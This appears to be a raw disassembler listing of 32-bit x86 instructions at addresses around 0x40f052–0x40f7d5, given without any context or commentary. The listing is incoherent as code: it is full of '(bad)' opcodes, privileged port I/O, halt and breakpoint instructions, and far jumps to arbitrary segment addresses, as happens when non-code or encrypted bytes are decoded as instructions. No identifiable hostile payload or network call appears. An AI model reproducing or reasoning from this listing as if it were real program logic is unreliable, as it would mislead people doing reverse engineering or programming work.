  40f052:	inc    eax
  40f053:	ins    DWORD PTR es:[edi],dx
  40f054:	jb     0x40f050
  40f056:	in     eax,0x32
  40f058:	pop    eax
  40f059:	in     eax,dx
  40f05a:	jnp    0x40f00d
  40f05c:	push   eax
  40f05d:	test   DWORD PTR [ecx-0x31],edi
  40f060:	push   ebx
  40f061:	sub    BYTE PTR [edi],0x9b
  40f064:	jbe    0x40f045
  40f066:	ret    
  40f067:	adc    DWORD PTR [ecx],ebp
  40f069:	fcomp  DWORD PTR [esi-0x54]
  40f06c:	ret    0xa780
  40f06f:	cmp    dh,BYTE PTR [eax-0x26574a7b]
  40f075:	push   0x6ac726
	...
  40f0be:	add    ah,ch
  40f0c0:	ss ins BYTE PTR es:[edi],dx
  40f0c2:	or     esi,edi
  40f0c4:	pop    ebx
  40f0c5:	in     eax,dx
  40f0c6:	test   DWORD PTR [edi-0x26],0x6d989ed2
  40f0cd:	cmp    al,0x32
  40f0cf:	out    0xf6,eax
  40f0d1:	add    BYTE PTR [eax],al
  40f0d3:	and    al,BYTE PTR [edi]
  40f0d5:	add    BYTE PTR [eax],al
  40f0d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0d8:	sbb    eax,0xbd5f2cf4
  40f0dd:	pop    ecx
  40f0de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0df:	outs   dx,DWORD PTR ds:[esi]
  40f0e0:	adc    eax,0xdbc951f8
  40f0e5:	jne    0x40f0ba
  40f0e7:	addr16 inc ecx
  40f0e9:	es sbb esi,esp
  40f0ec:	xchg   ecx,eax
  40f0ed:	push   0x33
  40f0ef:	loop   0x40f166
  40f0f1:	fdiv   QWORD PTR [eax]
  40f0f3:	pop    esp
  40f0f4:	cdq    
  40f0f5:	call   0x4c3f2b8c
  40f0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0fb:	pop    ebx
  40f0fc:	mov    esp,0xfbbbd017
  40f101:	pop    ebx
  40f102:	xor    DWORD PTR [ebx],0xf354298e
  40f108:	ret    
  40f109:	rcl    BYTE PTR [ebx+0x5a],cl
  40f10c:	pop    ecx
  40f10d:	inc    edx
  40f10e:	dec    esp
  40f10f:	std    
  40f110:	or     BYTE PTR ds:0xcda6eb0a,0xc9
  40f117:	xlat   BYTE PTR ds:[ebx]
  40f118:	jbe    0x40f178
  40f11a:	nop
  40f11b:	and    dh,ah
  40f11d:	(bad)  
  40f11e:	mov    dl,0x52
  40f120:	push   ds
  40f121:	ret    0x3671
  40f124:	dec    ecx
  40f125:	pop    edi
  40f126:	test   BYTE PTR [ebp+0x3],ch
  40f129:	(bad)  
  40f12a:	xchg   esi,eax
  40f12b:	jbe    0x40f19f
  40f12d:	sti    
  40f12e:	repz (bad) 
  40f130:	xchg   ebp,eax
  40f131:	loopne 0x40f19c
  40f133:	xor    al,BYTE PTR [eax-0x301ac580]
  40f139:	hlt    
  40f13a:	push   ebp
  40f13b:	shl    BYTE PTR [edi],0xea
  40f13e:	and    BYTE PTR [eax+0x3ead2f3a],dl
  40f144:	jle    0x40f191
  40f146:	push   0x16
  40f148:	adc    ebx,DWORD PTR [ebx+ebp*2]
  40f14b:	sbb    dl,cl
  40f14d:	iret   
  40f14e:	add    BYTE PTR [ecx-0x2fa67fb3],bl
  40f154:	aas    
  40f155:	mov    bh,0xc9
  40f157:	stos   DWORD PTR es:[edi],eax
  40f158:	or     BYTE PTR [ecx+0x4a3502f0],ch
  40f15e:	int    0x7b
  40f160:	mov    eax,ds:0xa1113583
  40f165:	js     0x40f185
  40f167:	inc    BYTE PTR [ecx-0x12]
  40f16a:	(bad)  
  40f16b:	(bad)
  40f16e:	jb     0x40f13b
  40f170:	xchg   DWORD PTR [esi-0x38],esi
  40f173:	imul   ecx,DWORD PTR [ebp-0x58],0xa785ffcc
  40f17a:	fs sub al,0x73
  40f17d:	adc    dl,bh
  40f17f:	leave  
  40f180:	mov    eax,ds:0x7b1f5c23
  40f185:	and    eax,0x816ab12a
  40f18a:	xchg   edx,eax
  40f18b:	or     esp,esi
  40f18d:	popa   
  40f18e:	pushfw 
  40f190:	nop
  40f191:	sub    edi,eax
  40f193:	loop   0x40f1b3
  40f195:	pop    ecx
  40f196:	jl     0x40f20d
  40f198:	jg     0x40f208
  40f19a:	pop    ebx
  40f19b:	push   ebp
  40f19c:	jae    0x40f1f4
  40f19e:	les    esp,FWORD PTR [edx]
  40f1a0:	push   esp
  40f1a1:	popa   
  40f1a2:	push   ebx
  40f1a3:	ins    BYTE PTR es:[edi],dx
  40f1a4:	cwde   
  40f1a5:	iret   
  40f1a6:	shr    ah,cl
  40f1a8:	ja     0x40f174
  40f1aa:	sub    al,0x26
  40f1ac:	in     eax,dx
  40f1ad:	icebp  
  40f1ae:	jp     0x40f211
  40f1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b1:	ja     0x40f1b0
  40f1b3:	sub    DWORD PTR ds:0x1eabf742,edi
  40f1b9:	bound  edx,QWORD PTR [eax-0x31d7fe30]
  40f1bf:	and    dh,BYTE PTR [ebx+0x4f]
  40f1c2:	inc    esp
  40f1c3:	fmul   DWORD PTR [edx+0x1e00a894]
  40f1c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ca:	leave  
  40f1cb:	cmp    BYTE PTR [ebp-0x1a],al
  40f1ce:	les    edx,FWORD PTR [ecx-0x2]
  40f1d1:	sbb    DWORD PTR [edi+0x4],ebx
  40f1d4:	inc    ecx
  40f1d5:	sub    DWORD PTR [eax-0x2a9bcbde],esp
  40f1db:	clc    
  40f1dc:	xchg   DWORD PTR [esi],ebx
  40f1de:	sub    ebx,DWORD PTR [edx+0x29]
  40f1e1:	xor    eax,0xe66b076f
  40f1e6:	lods   al,BYTE PTR ds:[esi]
  40f1e7:	popa   
  40f1e8:	mov    esp,0xb8a69e8f
  40f1ed:	dec    ecx
  40f1ee:	sub    eax,0xf960d08a
  40f1f3:	mov    al,ds:0x1967a86e
  40f1f8:	push   ss
  40f1f9:	add    al,0xc5
  40f1fb:	dec    eax
  40f1fc:	in     al,0x19
  40f1fe:	lock lds esp,FWORD PTR [ebx-0x3c]
  40f202:	push   0x2a
  40f204:	cmp    DWORD PTR [eax+0x3a6afa66],ebx
  40f20a:	out    dx,eax
  40f20b:	repz or eax,0x99eba55b
  40f211:	test   eax,0x2d60ce1
  40f216:	jbe    0x40f1a9
  40f218:	jmp    0xa0b45c1c
  40f21d:	test   al,0x3d
  40f21f:	fisubr DWORD PTR [eax+0x7a8ff8de]
  40f225:	fisttp QWORD PTR [edx-0x70]
  40f228:	add    cl,dl
  40f22a:	mov    edx,0x9b7eaeca
  40f22f:	pop    edx
  40f230:	mov    ds:0x91aeb478,eax
  40f235:	push   esp
  40f236:	sbb    BYTE PTR [edi+edi*8+0x1f],bl
  40f23a:	pop    edi
  40f23b:	call   0xee5eec5b
  40f240:	int3   
  40f241:	xor    DWORD PTR [ecx+edx*4-0x1d],edx
  40f245:	shl    BYTE PTR [eax-0x78],cl
  40f248:	es add dh,ah
  40f24b:	addr16 xchg esi,eax
  40f24d:	ss push ss
  40f24f:	je     0x40f212
  40f251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f252:	iret   
  40f253:	shl    BYTE PTR [ecx-0x461cd9ba],1
  40f259:	aad    0x55
  40f25b:	xor    edi,DWORD PTR [ebp-0x33cb7e19]
  40f261:	and    BYTE PTR ds:0x2dec15ba,0xe0
  40f268:	or     al,0xe4
  40f26a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f26b:	lahf   
  40f26c:	bound  esp,QWORD PTR [edi]
  40f26e:	push   esi
  40f26f:	dec    edi
  40f270:	lock pop esp
  40f272:	add    esp,esp
  40f274:	xchg   DWORD PTR [ecx+0x1ccbcd9f],esp
  40f27a:	popa   
  40f27b:	in     eax,0x71
  40f27d:	dec    esi
  40f27e:	inc    esp
  40f27f:	mov    al,cs:0x85093f9c
  40f285:	mov    ah,0x5b
  40f287:	cmc    
  40f288:	mov    dh,0x85
  40f28a:	sbb    DWORD PTR [ecx+0x32],esi
  40f28d:	jle    0x40f2b6
  40f28f:	adc    esp,edx
  40f291:	pop    eax
  40f292:	test   DWORD PTR [edi],ecx
  40f294:	int    0xe9
  40f296:	push   edx
  40f297:	mov    al,ds:0x4f4bfc4c
  40f29c:	cdq    
  40f29d:	test   al,0x74
  40f29f:	mov    esi,0x33232ec8
  40f2a4:	(bad)  
  40f2a6:	mov    ebp,0x5a7b975a
  40f2ab:	xchg   edx,eax
  40f2ac:	mov    bl,0x91
  40f2ae:	jl     0x40f2fa
  40f2b0:	or     BYTE PTR [edx+0x14],bh
  40f2b3:	aas    
  40f2b4:	clc    
  40f2b5:	jne    0x40f2d4
  40f2b7:	cs pop es
  40f2b9:	ins    DWORD PTR es:[edi],dx
  40f2ba:	mov    DWORD PTR [esi-0x52],esp
  40f2bd:	xor    DWORD PTR [ebx],esp
  40f2bf:	sub    eax,0xc3146b70
  40f2c4:	ret    0x7530
  40f2c7:	sbb    al,0x8d
  40f2c9:	mov    bl,0xfa
  40f2cb:	adc    edx,0xaaa6b4e
  40f2d1:	pop    ecx
  40f2d2:	das    
  40f2d3:	stc    
  40f2d4:	adc    eax,0x3084c8f1
  40f2d9:	mov    dl,0x90
  40f2db:	mov    bl,0x1d
  40f2dd:	mov    edx,0x3526a2c6
  40f2e2:	dec    edi
  40f2e3:	xor    eax,0x27cb9ceb
  40f2e8:	(bad)  
  40f2e9:	data16 into 
  40f2eb:	(bad)  
  40f2ec:	mov    eax,DWORD PTR [edi+0x62]
  40f2ef:	(bad)  
  40f2f0:	mov    eax,0x5df1fe41
  40f2f5:	lea    edi,[edx-0x25]
  40f2f8:	dec    ebp
  40f2f9:	sbb    eax,DWORD PTR [ebx-0x27]
  40f2fc:	pushf  
  40f2fd:	fistp  DWORD PTR [ebx]
  40f2ff:	fnsave [eax-0x1]
  40f302:	sti    
  40f303:	inc    edi
  40f304:	stos   DWORD PTR es:[edi],eax
  40f305:	push   eax
  40f306:	js     0x40f34f
  40f308:	out    dx,eax
  40f309:	test   BYTE PTR [edi+0x6e50470],cl
  40f30f:	mov    ecx,0x3ce9255c
  40f314:	mov    esp,DWORD PTR [edi-0x70b57f40]
  40f31a:	rcl    ch,0xbf
  40f31d:	jl     0x40f385
  40f31f:	mov    edi,0xe841d0d4
  40f324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f325:	pop    es
  40f326:	pop    ecx
  40f327:	xchg   esp,eax
  40f328:	enter  0x4df9,0xe3
  40f32c:	or     BYTE PTR ds:[edi+0x15f21fd2],ch
  40f333:	sub    BYTE PTR [eax],bl
  40f335:	outs   dx,DWORD PTR ds:[esi]
  40f336:	pop    eax
  40f337:	pop    edi
  40f338:	add    DWORD PTR [ecx+0x76b48369],ebp
  40f33e:	jecxz  0x40f382
  40f340:	xor    edi,DWORD PTR [ebx]
  40f342:	outs   dx,BYTE PTR ds:[esi]
  40f343:	loop   0x40f381
  40f345:	xor    eax,0xba40423f
  40f34a:	lock add BYTE PTR [ebx],ch
  40f34d:	sbb    BYTE PTR ds:0xbd4284fa,ch
  40f353:	jns    0x40f2f8
  40f355:	jnp    0x40f35f
  40f357:	add    al,0x8a
  40f359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f35a:	adc    BYTE PTR [edi+0x25b1d2de],ch
  40f360:	push   edx
  40f361:	add    eax,DWORD PTR es:[edi+0x7a0678ed]
  40f368:	adc    dl,BYTE PTR [ebp+0x64ee0cd5]
  40f36e:	shl    eax,0xc1
  40f371:	mov    ch,0x65
  40f373:	xchg   DWORD PTR [edx],ebx
  40f375:	mov    DWORD PTR [ebp+0x47cefdbb],esp
  40f37b:	push   0x145694dc
  40f380:	mov    bl,0x1f
  40f382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f383:	gs pop esp
  40f385:	xchg   DWORD PTR [ebx-0x6e78af80],esi
  40f38b:	pop    ebp
  40f38c:	sub    ecx,esi
  40f38e:	test   esp,edx
  40f390:	push   edi
  40f391:	je     0x40f3c8
  40f393:	push   ebp
  40f394:	sbb    edi,ebx
  40f396:	addr16 adc eax,0xf315b2c2
  40f39c:	mov    bl,0xb1
  40f39e:	icebp  
  40f39f:	cwde   
  40f3a0:	jp     0x40f3da
  40f3a2:	inc    ecx
  40f3a3:	jmp    0xe095:0xade3f21d
  40f3aa:	add    DWORD PTR [edx],esi
  40f3ac:	test   eax,0xbda984be
  40f3b1:	pop    edx
  40f3b2:	mov    ah,BYTE PTR [eax]
  40f3b4:	out    dx,al
  40f3b5:	sub    ebx,ebp
  40f3b7:	stos   BYTE PTR es:[edi],al
  40f3b8:	ja     0x40f35c
  40f3ba:	xchg   ebx,eax
  40f3bb:	mov    ch,0x11
  40f3bd:	scas   al,BYTE PTR es:[edi]
  40f3be:	xchg   edi,eax
  40f3bf:	fadd   DWORD PTR ds:0x91a0e990
  40f3c5:	and    esp,DWORD PTR [edi]
  40f3c7:	cmc    
  40f3c8:	jnp    0x40f435
  40f3ca:	inc    edi
  40f3cb:	je     0x40f3f8
  40f3cd:	shl    BYTE PTR [esi],1
  40f3cf:	daa    
  40f3d0:	pop    eax
  40f3d1:	and    al,0x34
  40f3d3:	mov    al,0xf9
  40f3d5:	mov    bh,BYTE PTR [ebx-0x1f]
  40f3d8:	cld    
  40f3d9:	cmp    DWORD PTR [ecx-0xfb1db99],ebp
  40f3df:	jle    0x40f3cc
  40f3e1:	sub    eax,0x24b4f73e
  40f3e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3e7:	mov    dh,0x1f
  40f3e9:	adc    dl,dl
  40f3eb:	out    dx,eax
  40f3ec:	fldenv [edi+0x52]
  40f3ef:	fst    QWORD PTR [ebx+0x5e]
  40f3f2:	call   0x8424:0x9331884f
  40f3f9:	mov    DWORD PTR [eax+eiz*1],edi
  40f3fc:	dec    esp
  40f3fd:	retf   0xabf1
  40f400:	and    ebp,DWORD PTR [ebx-0x6c]
  40f403:	sahf   
  40f404:	outs   dx,DWORD PTR ds:[esi]
  40f405:	fcomp  st(0)
  40f407:	mov    esi,ds
  40f409:	adc    BYTE PTR [ecx],ah
  40f40b:	bound  eax,QWORD PTR [esi-0x60]
  40f40e:	xor    ah,BYTE PTR [ebp+0x52d59b6]
  40f414:	mov    ?,WORD PTR [edx-0xe]
  40f417:	mov    dl,0xac
  40f419:	out    dx,eax
  40f41a:	xor    al,0x8a
  40f41c:	add    ch,BYTE PTR [edx-0x33]
  40f41f:	sbb    BYTE PTR [eax-0x31],0x3a
  40f423:	pop    ebx
  40f424:	lahf   
  40f425:	cmp    DWORD PTR [ebx],ebp
  40f427:	ins    DWORD PTR es:[edi],dx
  40f428:	adc    eax,0x5e3e73c3
  40f42d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f42e:	jg     0x40f436
  40f430:	vrcpss xmm2,xmm6,DWORD PTR [ebp+0x6adc0ba0]
  40f438:	push   es
  40f439:	shr    DWORD PTR [edx],cl
  40f43b:	xor    cl,BYTE PTR [edx+0x69]
  40f43e:	sti    
  40f43f:	repnz mov dl,0xc9
  40f442:	fld    st(2)
  40f444:	cld    
  40f445:	adc    eax,0x30b8f73
  40f44a:	fst    DWORD PTR [edx]
  40f44c:	int3   
  40f44d:	xor    eax,0xb432a27b
  40f452:	xor    DWORD PTR [esi-0x6881db56],edi
  40f458:	scas   al,BYTE PTR es:[edi]
  40f459:	je     0x40f3f4
  40f45b:	stos   BYTE PTR es:[edi],al
  40f45c:	pop    ss
  40f45d:	mov    ?,WORD PTR [edx]
  40f45f:	mov    bh,0xc6
  40f461:	dec    esi
  40f462:	fst    st(6)
  40f464:	(bad)
  40f467:	pop    DWORD PTR [ebx-0x34]
  40f46a:	pop    ecx
  40f46b:	in     eax,dx
  40f46c:	int3   
  40f46d:	int3   
  40f46e:	scas   eax,DWORD PTR es:[edi]
  40f46f:	icebp  
  40f470:	and    al,0x39
  40f472:	sbb    dl,al
  40f474:	mov    esp,0x3ae31cab
  40f479:	dec    esp
  40f47a:	iret   
  40f47b:	fstp   TBYTE PTR [ecx]
  40f47d:	popa   
  40f47e:	inc    edx
  40f47f:	sub    esp,DWORD PTR [eax-0x796d318]
  40f485:	sbb    ah,cl
  40f487:	repnz or dh,BYTE PTR [esi+ebp*8-0x1ab78dc2]
  40f48f:	xor    eax,0xf2c8a7da
  40f494:	lock cmp eax,0xfe41abf0
  40f49a:	scas   al,BYTE PTR es:[edi]
  40f49b:	jmp    0x4c02:0xd8e3bfd1
  40f4a2:	shl    DWORD PTR [ecx+eiz*2+0x40a3e5ff],0x91
  40f4aa:	cdq    
  40f4ab:	add    eax,0xffffff93
  40f4ae:	xor    BYTE PTR ds:[edx],0x3d
  40f4b2:	sub    BYTE PTR [eax],al
  40f4b4:	push   ebp
  40f4b5:	loope  0x40f4d7
  40f4b7:	push   ds
  40f4b8:	pop    ds
  40f4b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4ba:	sar    DWORD PTR [edx+0x757ce38f],0xfc
  40f4c1:	sahf   
  40f4c2:	jecxz  0x40f46e
  40f4c4:	int    0x20
  40f4c6:	out    dx,al
  40f4c7:	(bad)  
  40f4c8:	neg    DWORD PTR [ecx-0x3ff66105]
  40f4ce:	jmp    0xd3f04040
  40f4d3:	gs push 0x59
  40f4d6:	cmc    
  40f4d7:	rol    DWORD PTR [ecx+0x70],0xb5
  40f4db:	aas    
  40f4dc:	outs   dx,BYTE PTR ds:[esi]
  40f4dd:	rcl    BYTE PTR [edx+eax*1+0x67],1
  40f4e1:	cmp    DWORD PTR [edx+esi*8],0x52
  40f4e5:	mov    esi,?
  40f4e7:	push   edi
  40f4e8:	fadd   QWORD PTR [esi+0x2ec61295]
  40f4ee:	rcr    esi,1
  40f4f0:	bound  edx,QWORD PTR [ebx+eiz*1-0x1e]
  40f4f4:	hlt    
  40f4f5:	cmp    eax,edi
  40f4f7:	jnp    0x40f4d2
  40f4f9:	sub    dh,BYTE PTR [ecx-0x7d002ba7]
  40f4ff:	cli    
  40f500:	cmp    BYTE PTR [ecx],dh
  40f502:	lods   eax,DWORD PTR ds:[esi]
  40f503:	jae    0x40f566
  40f505:	inc    edx
  40f506:	fs xchg edi,eax
  40f508:	mov    eax,0xa9c1e33b
  40f50d:	xchg   ebx,eax
  40f50e:	jle    0x40f500
  40f510:	push   ebx
  40f511:	dec    eax
  40f512:	nop
  40f513:	mov    cl,0x1a
  40f515:	fs data16 adc al,0x85
  40f519:	jne    0x40f4fb
  40f51b:	cld    
  40f51c:	mov    esp,0x200269c0
  40f521:	cmp    eax,0x14fb95e0
  40f526:	xchg   ebp,eax
  40f527:	daa    
  40f528:	bound  ebx,QWORD PTR [ecx+0x2c51b8d7]
  40f52e:	aam    0xe3
  40f530:	cmp    edx,edi
  40f532:	and    BYTE PTR [ebx+eiz*4+0x2fc01d75],bh
  40f539:	dec    ecx
  40f53a:	add    edx,edi
  40f53c:	les    edx,FWORD PTR [ebp-0x38d10c7a]
  40f542:	dec    esp
  40f543:	aas    
  40f544:	ja     0x40f5ae
  40f546:	inc    esp
  40f547:	sbb    DWORD PTR [esi],0x5617995b
  40f54d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f54e:	push   esp
  40f54f:	leave  
  40f550:	xchg   edi,eax
  40f551:	inc    ebp
  40f552:	pop    esp
  40f553:	jae    0x40f546
  40f555:	add    al,0x47
  40f557:	ror    DWORD PTR [ebx+0x1b219140],1
  40f55d:	fsub   DWORD PTR [esi]
  40f55f:	xchg   ch,dl
  40f561:	das    
  40f562:	jmp    FWORD PTR [esp+ecx*8+0x4]
  40f566:	daa    
  40f567:	mov    ch,0x16
  40f569:	jae    0x40f53b
  40f56b:	adc    cl,BYTE PTR [ecx+0x3a]
  40f56e:	push   ds
  40f56f:	push   cs
  40f570:	sub    DWORD PTR [edx+0x2633db40],edx
  40f576:	fdivrp st(1),st
  40f578:	add    ch,al
  40f57a:	cs inc edi
  40f57c:	adc    dh,BYTE PTR [ebp+0x95b97a5]
  40f582:	sub    edi,DWORD PTR [edi-0x206df460]
  40f588:	push   0x76
  40f58a:	or     BYTE PTR es:[ecx],0x48
  40f58e:	sbb    DWORD PTR [ebx+0xd6c4891],esp
  40f594:	ss xor al,0x3d
  40f597:	std    
  40f598:	ja     0x40f5b6
  40f59a:	in     eax,dx
  40f59b:	int3   
  40f59c:	test   BYTE PTR [ebx+0x50],bh
  40f59f:	pushf  
  40f5a0:	in     eax,dx
  40f5a1:	and    eax,0x86b49e11
  40f5a7:	(bad)  
  40f5a8:	dec    ebx
  40f5a9:	sub    eax,0xa8db4060
  40f5ae:	sbb    BYTE PTR ds:0x8c7a6953,al
  40f5b4:	jmp    0x1d6:0x290081ea
  40f5bb:	std    
  40f5bc:	out    0x4,eax
  40f5be:	or     BYTE PTR [ebp+0x33fd2d50],al
  40f5c4:	clc    
  40f5c5:	and    eax,0xc79c8c5f
  40f5ca:	inc    ecx
  40f5cb:	adc    DWORD PTR [ebp+edx*4-0x5caa380d],edx
  40f5d2:	jb     0x40f619
  40f5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5d5:	mov    bl,0x93
  40f5d7:	aam    0x7f
  40f5d9:	jp     0x40f5e7
  40f5db:	pop    edx
  40f5dc:	push   eax
  40f5dd:	int    0xb4
  40f5df:	daa    
  40f5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5e1:	dec    edx
  40f5e2:	mov    WORD PTR [ebx+0x7561716e],?
  40f5e8:	xchg   edi,eax
  40f5e9:	pop    es
  40f5ea:	cmp    eax,0x60703641
  40f5ef:	clc    
  40f5f0:	jecxz  0x40f5ec
  40f5f2:	mov    edi,0x898d90bc
  40f5f7:	mov    al,ds:0x651d903e
  40f5fc:	push   edi
  40f5fd:	outs   dx,DWORD PTR ds:[esi]
  40f5fe:	pop    ecx
  40f5ff:	iret   
  40f600:	es xor esp,0x79
  40f604:	lods   eax,DWORD PTR ds:[esi]
  40f605:	mov    dh,0x93
  40f607:	cs jmp 0xf721adae
  40f60d:	icebp  
  40f60e:	mov    cl,dl
  40f610:	mov    dh,0x7d
  40f612:	leave  
  40f613:	ja     0x40f684
  40f615:	bound  edx,QWORD PTR [edx+ebx*8-0x71]
  40f619:	cli    
  40f61a:	(bad)  
  40f61b:	or     esp,edi
  40f61d:	das    
  40f61e:	aam    0xf5
  40f620:	ficomp DWORD PTR ds:0x5c30532f
  40f626:	sub    bl,BYTE PTR [eax-0x36125e60]
  40f62c:	ins    DWORD PTR es:[edi],dx
  40f62d:	(bad)  
  40f62e:	pop    esp
  40f62f:	aad    0x82
  40f631:	push   0x2f
  40f633:	ja     0x40f63b
  40f635:	jge    0x40f6a3
  40f637:	xchg   esp,eax
  40f638:	in     al,0x90
  40f63a:	push   0x96812125
  40f63f:	fistp  DWORD PTR [edi-0x57]
  40f642:	retf   0x49eb
  40f645:	mov    bh,0x75
  40f647:	aas    
  40f648:	push   edi
  40f649:	inc    esi
  40f64a:	dec    esp
  40f64b:	cmc    
  40f64c:	scas   al,BYTE PTR es:[edi]
  40f64d:	or     DWORD PTR [eax],ebx
  40f64f:	iret   
  40f650:	mov    cl,0x8e
  40f652:	mov    eax,ds:0x8cdd5d30
  40f657:	push   cs
  40f658:	fs in  eax,dx
  40f65a:	mov    al,ds:0x41c85721
  40f65f:	nop
  40f660:	sbb    al,BYTE PTR [eax]
  40f662:	(bad)  
  40f663:	(bad)  
  40f664:	sahf   
  40f665:	in     eax,dx
  40f666:	or     eax,0xf621b4c6
  40f66b:	int    0xd4
  40f66d:	dec    ebp
  40f66e:	pop    eax
  40f66f:	xchg   edx,eax
  40f670:	inc    ecx
  40f671:	inc    edi
  40f672:	call   0x76fae4e3
  40f677:	dec    ecx
  40f678:	or     DWORD PTR [edi+0x14b180eb],ecx
  40f67e:	ret    
  40f67f:	cmp    BYTE PTR [eax],ch
  40f681:	jb     0x40f65b
  40f683:	jg     0x40f6b2
  40f685:	push   esi
  40f686:	icebp  
  40f687:	call   FWORD PTR [edx+0x10]
  40f68a:	xor    al,0x6
  40f68c:	ss pop esi
  40f68e:	in     eax,0xcc
  40f690:	and    DWORD PTR [ecx-0x8],0x1d
  40f694:	jl     0x40f6be
  40f696:	jbe    0x40f6c2
  40f698:	data16 in al,dx
  40f69a:	(bad)  
  40f69b:	or     al,0x8a
  40f69d:	fistp  WORD PTR [ebx+0x7aa13fe0]
  40f6a3:	and    BYTE PTR [esi],0x4d
  40f6a6:	aad    0xc9
  40f6a8:	push   0x60
  40f6aa:	xor    BYTE PTR [ecx],0x79
  40f6ad:	mov    ah,0x62
  40f6af:	adc    BYTE PTR [ebx+0x64c48d42],dl
  40f6b5:	xchg   BYTE PTR [eax-0x19efee0a],dl
  40f6bb:	push   ds
  40f6bc:	mov    esp,0xf5f8e6b2
  40f6c1:	pop    esi
  40f6c2:	push   ebp
  40f6c3:	jmp    0x80da:0x3bc05db0
  40f6ca:	xor    ebp,DWORD PTR ds:[edx-0x6ca6fe6c]
  40f6d1:	jge    0x40f74b
  40f6d3:	shr    BYTE PTR [edi-0x3f],1
  40f6d6:	arpl   si,ax
  40f6d8:	push   ecx
  40f6d9:	and    esp,eax
  40f6db:	xor    edx,DWORD PTR [eax-0x10c9310f]
  40f6e1:	and    DWORD PTR [ebx],edx
  40f6e3:	jo     0x40f6e8
  40f6e5:	lahf   
  40f6e6:	sub    al,ch
  40f6e8:	jo     0x40f759
  40f6ea:	ret    
  40f6eb:	inc    esi
  40f6ec:	lods   al,BYTE PTR ds:[esi]
  40f6ed:	jmp    0x859:0x6e0dbe5a
  40f6f4:	in     eax,dx
  40f6f5:	ret    0xaa48
  40f6f8:	lods   eax,DWORD PTR ds:[esi]
  40f6f9:	imul   esp,ebx,0xffffffd7
  40f6fc:	outs   dx,DWORD PTR ds:[esi]
  40f6fd:	cmp    eax,0x76138655
  40f702:	mov    al,0x68
  40f704:	and    BYTE PTR [edx+0x74],ah
  40f707:	daa    
  40f708:	jbe    0x40f6b0
  40f70a:	dec    ecx
  40f70b:	jne    0x40f69d
  40f70d:	arpl   WORD PTR [edx],di
  40f70f:	xchg   BYTE PTR [ecx+0xb],dh
  40f712:	jb     0x40f6f4
  40f714:	pop    ebp
  40f715:	mov    al,ds:0x9f1e4db4
  40f71a:	xchg   esi,eax
  40f71b:	lock sub eax,0xbeaf1414
  40f721:	arpl   WORD PTR [ecx],bp
  40f723:	sbb    eax,0x1b94b5a9
  40f728:	leave  
  40f729:	mov    eax,0x95c3ee8d
  40f72f:	xchg   ebx,eax
  40f730:	dec    ecx
  40f731:	pop    ebp
  40f732:	jno    0x40f78a
  40f734:	adc    eax,0x70a67d2d
  40f739:	mov    ebp,ebx
  40f73b:	inc    esp
  40f73c:	retf   
  40f73d:	dec    esi
  40f73e:	cmp    BYTE PTR [ebp+0x71],bh
  40f741:	push   cs
  40f742:	ja     0x40f778
  40f744:	push   0x52
  40f746:	jae    0x40f73a
  40f748:	mov    bl,0x98
  40f74a:	(bad)
  40f74e:	add    BYTE PTR [esi],cl
  40f750:	int    0x9b
  40f752:	int    0xe8
  40f754:	call   0x570f9b17
  40f759:	cmp    al,0xcd
  40f75b:	stc    
  40f75c:	icebp  
  40f75d:	push   ecx
  40f75e:	outs   dx,DWORD PTR ds:[esi]
  40f75f:	mov    al,ds:0x48a45814
  40f764:	mov    edi,0x61df210
  40f769:	dec    ecx
  40f76a:	test   DWORD PTR [eax+edi*8-0xb],ebp
  40f76e:	fwait
  40f76f:	dec    esp
  40f770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f771:	lds    ebx,FWORD PTR [edi]
  40f773:	xor    al,0xa5
  40f775:	pop    ebp
  40f776:	jg     0x40f7da
  40f778:	dec    ebx
  40f779:	jl     0x40f713
  40f77b:	scas   al,BYTE PTR es:[edi]
  40f77c:	fst    QWORD PTR [ebp-0x6b]
  40f77f:	add    esp,ebp
  40f781:	es ret 0xb1cb
  40f785:	rol    BYTE PTR [eax],cl
  40f787:	push   edx
  40f788:	popa   
  40f789:	ds and ecx,DWORD PTR es:[edx]
  40f78d:	jae    0x40f755
  40f78f:	mov    eax,0x4a6d6623
  40f794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f795:	icebp  
  40f796:	push   es
  40f797:	push   ebp
  40f798:	data16 in al,0x26
  40f79b:	sti    
  40f79c:	mov    ch,0x26
  40f79e:	sbb    bl,bl
  40f7a0:	fdiv   st,st(4)
  40f7a2:	xor    al,0xca
  40f7a4:	stos   DWORD PTR es:[edi],eax
  40f7a5:	addr16 call 0xa460:0xb3c85b27
  40f7ad:	fs fdivp st(2),st
  40f7b0:	push   ebp
  40f7b1:	in     al,dx
  40f7b2:	inc    esp
  40f7b3:	(bad)  
  40f7b4:	inc    esp
  40f7b5:	fild   DWORD PTR ds:0xd8ac1b0b
  40f7bb:	out    dx,al
  40f7bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7bd:	push   ecx
  40f7bf:	ja     0x40f784
  40f7c1:	pop    es
  40f7c2:	jp     0x40f798
  40f7c4:	cmp    bl,ch
  40f7c6:	outs   dx,BYTE PTR ds:[esi]
  40f7c7:	icebp  
  40f7c8:	push   edx
  40f7c9:	mov    edi,0x55d4bd6c
  40f7ce:	mov    dl,0x68
  40f7d0:	xchg   esi,eax
  40f7d1:	xor    edi,esp
  40f7d3:	rcl    ch,cl
  40f7d5:	mov    WORD PTR [ebx+0x3a8c53f2],gs
